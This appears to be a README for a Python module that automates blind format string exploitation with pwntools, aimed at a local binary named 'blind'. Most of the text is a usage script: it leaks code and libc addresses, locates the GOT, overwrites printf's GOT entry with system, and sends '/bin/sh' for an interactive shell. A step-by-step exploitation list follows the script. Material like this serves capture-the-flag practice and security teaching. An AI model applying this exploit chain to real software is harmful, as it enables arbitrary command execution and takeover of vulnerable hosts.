## Blind Format String Exploitation 
This is a module to exploit blind format string vulnerability  

### How to use it ?
```python
from pwn import *
from frmstr import *

p = process('blind')
saveSocket = p

base_addr = 0x08048000

data = leak_code(r,263,2,0x0804852b,10) # leak_code(r,offset,pad,start_addr,size)
print disasm(data,arch='i386')
d, dynamic_ptr = leak_libc_ptr(p,base_addr)
system_libc  = leak_libc(d,'system')
fprintf_libc = leak_libc(d,'fprintf')

got_addr = find_got(p,dynamic_ptr)
printf_got = resolve_got(got_addr, fprintf_libc)

send_payload(p,printf_got, system_libc,6)
#send_rev_payload(r,0x804a020,0xbffff92c,261)
p.sendline('/bin/sh\x00')
p.interactive()
p.close()

```

#### Steps For Exploitation
1) leak the code

2) leak Libc usinf pwntools Dynelf module

3) leak .dynamic ptr and then GOT table addr 

4) leak printf_got

5) Overwrite printf_got with system addr </p>

6) send /bin/sh 
